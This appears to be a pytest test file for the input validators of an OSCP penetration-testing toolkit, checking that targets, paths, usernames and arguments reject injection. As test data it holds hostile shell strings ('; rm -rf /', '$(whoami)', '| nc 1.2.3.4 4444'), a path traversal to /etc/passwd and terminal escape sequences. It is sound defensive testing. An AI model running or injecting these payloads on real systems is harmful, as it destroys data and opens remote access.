"""The security core.

Every tool's injection resistance now routes through these functions, so this is
the one place worth testing exhaustively. The rule under test throughout: bad input
is REJECTED, never quietly rewritten into something acceptable.
"""

import pytest

from oscp_toolkit._common import text, validate as v

# The payloads used in the manual sweeps against every tool.
PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "&& reboot",
    "| nc 1.2.3.4 4444",
    "\nreboot",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_target_rejects_shell_metacharacters(payload):
    with pytest.raises(v.ValidationError):
        v.validate_target(f"10.10.10.10{payload}")


@pytest.mark.parametrize("payload", PAYLOADS)
def test_path_rejects_shell_metacharacters(payload):
    with pytest.raises(v.ValidationError):
        v.checked_path(f"/tmp/loot{payload}")


@pytest.mark.parametrize("payload", PAYLOADS)
def test_host_rejects_shell_metacharacters(payload):
    with pytest.raises(v.ValidationError):
        v.validate_host(f"dc01.corp.local{payload}")


@pytest.mark.parametrize("payload", PAYLOADS)
def test_username_rejects_shell_metacharacters(payload):
    with pytest.raises(v.ValidationError):
        v.validate_username(f"jdoe{payload}")


def test_path_rejects_traversal():
    for bad in ["../../etc/passwd", "foo/../../bar", ".."]:
        with pytest.raises(v.ValidationError):
            v.checked_path(bad)


def test_legitimate_values_are_accepted():
    assert v.validate_target("10.10.10.10") == "10.10.10.10"
    assert v.validate_target("10.10.10.0/24") == "10.10.10.0/24"
    assert v.validate_target("dc01.corp.local") == "dc01.corp.local"
    assert v.validate_host("dc01.corp.local") == "dc01.corp.local"
    assert v.validate_username("svc_sql$") == "svc_sql$"     # machine accounts
    assert v.validate_domain("corp.local") == "corp.local"
    assert v.validate_port_list("80,443,8080") == "80,443,8080"
    assert v.validate_subnet("10.10.20.5") == "10.10.20.5/32"   # bare host -> /32
    assert v.validate_iface("tun0") == "tun0"


def test_ports_are_range_checked():
    for bad in [0, 65536, -1, "abc"]:
        with pytest.raises(v.ValidationError):
            v.validate_port(bad)
    assert v.validate_port("443") == 443


def test_ntlm_accepts_every_documented_form():
    nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
    assert v.validate_ntlm(nt).endswith(nt)
    assert v.validate_ntlm(f":{nt}").endswith(nt)
    assert v.validate_ntlm(f"{v.EMPTY_LM}:{nt}") == f"{v.EMPTY_LM}:{nt}"
    for bad in ["zzzz", "31d6cfe0", nt + "extra", f"nothex:{nt}"]:
        with pytest.raises(v.ValidationError):
            v.validate_ntlm(bad)


def test_password_is_the_documented_exception():
    """A real credential can contain any punctuation, so an allow-list there would
    reject valid logins. shell=False makes the content inert; only control
    characters and absurd length are refused."""
    assert v.validate_password("P@ssw0rd!;$(x)`y`|z") is not None
    for bad in ["pass\nword", "pass\x00word", "a" * (v.MAX_PASSWORD_LEN + 1)]:
        with pytest.raises(v.ValidationError):
            v.validate_password(bad)


def test_extra_args_split_and_allow_list():
    assert v.validate_extra_args("-T4 --min-rate=5000") == ["-T4", "--min-rate=5000"]
    for bad in ["-T4 ; rm -rf /", "$(whoami)", "-T4 | nc"]:
        with pytest.raises(v.ValidationError):
            v.validate_extra_args(bad)


# --- terminal-injection scrubbing -----------------------------------------

HOSTILE = "\x1b]0;HIJACKED\x07\x1b[2Jevil\x07\x08 name"


def test_scrub_removes_every_escape_byte():
    """The bug this exists for: a page title, sAMAccountName, PEAS line or loot
    filename repainting the terminal. Verified as a byte count, not a look."""
    out = text.scrub(HOSTILE)
    assert "\x1b" not in out
    assert "\x07" not in out
    assert "\x08" not in out
    assert "evil" in out          # the text survives, inert


def test_scrub_leaves_shell_metacharacters_as_inert_text():
    out = text.scrub("; rm -rf / $(whoami) `id`")
    assert out == "; rm -rf / $(whoami) `id`"


def test_scrub_truncates_and_collapses():
    assert text.scrub("a" * 500, limit=10) == "a" * 10
    assert text.scrub("a\t\t b\n\nc") == "a b c"


def test_redact_masks_secrets():
    assert v.redact("hunter2") == "******"
    assert v.redact("") == ""
